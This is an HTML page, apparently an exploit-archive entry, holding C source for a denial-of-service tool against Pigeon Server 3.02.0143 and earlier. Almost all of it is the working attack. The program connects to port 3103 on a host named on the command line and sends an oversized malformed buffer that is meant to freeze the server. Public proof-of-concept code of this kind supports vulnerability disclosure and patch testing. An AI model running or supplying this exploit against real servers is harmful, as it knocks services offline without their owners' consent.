<html>
<head>
<title>Pigeon Server DoS</title>
<pre>
/*

by Luigi Auriemma

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#ifdef WIN32
#include &lt;winsock.h&gt;
#include &quot;winerr.h&quot;

#define close closesocket
#else
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#endif

#define VER &quot;0.1&quot;
#define PORT 3103
#define BUFFSZ 8192 // we need at least 8180 'a's

u_long resolv(char *host);
void std_err(void);

int main(int argc, char *argv[]) {
struct sockaddr_in peer;
int sd;
u_short port = PORT;
u_char *buff;

setbuf(stdout, NULL);

fputs(&quot;\n&quot;
&quot;Pigeon server &lt;= 3.02.0143 freeze &quot;VER&quot;\n&quot;
&quot;by Luigi Auriemma\n&quot;
&quot;e-mail: aluigi@altervista.org\n&quot;
&quot;web: http://aluigi.altervista.org\n&quot;
&quot;\n&quot;, stdout);

if(argc &lt; 2) {
printf(&quot;\nUsage: %s &lt;server&gt; [port(%d)]\n&quot;
&quot;\n&quot;, argv[0], PORT);
exit(1);
}

#ifdef WIN32
WSADATA wsadata;
WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

if(argc &gt; 2) port = atoi(argv[2]);

peer.sin_addr.s_addr = resolv(argv[1]);
peer.sin_port = htons(port);
peer.sin_family = AF_INET;

printf(&quot;\n- target %s:%hu\n&quot;,
inet_ntoa(peer.sin_addr), port);

sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if(sd &lt; 0) std_err();

if(connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
&lt; 0) std_err();

buff = malloc(BUFFSZ);
if(!buff) std_err();
memset(buff, 'a', BUFFSZ);
buff[BUFFSZ - 5] = '|';
buff[BUFFSZ - 4] = '|';
buff[BUFFSZ - 3] = '1';
buff[BUFFSZ - 2] = '|';
buff[BUFFSZ - 1] = '|';

fputs(&quot;- send malformed data\n&quot;, stdout);
if(send(sd, buff, BUFFSZ, 0)
&lt; 0) std_err();

close(sd);
fputs(&quot;- the server should be freezed, check it manually\n\n&quot;, stdout);
return(0);
}

u_long resolv(char *host) {
struct hostent *hp;
u_long host_ip;

host_ip = inet_addr(host);
if(host_ip == INADDR_NONE) {
hp = gethostbyname(host);
if(!hp) {
printf(&quot;\nError: Unable to resolve hostname (%s)\n&quot;, host);
exit(1);
} else host_ip = *(u_long *)(hp-&gt;h_addr);
}
return(host_ip);
}

#ifndef WIN32
void std_err(void) {
perror(&quot;\nError&quot;);
exit(1);
}
#endif</pre>
//milw0rm.com
</html>

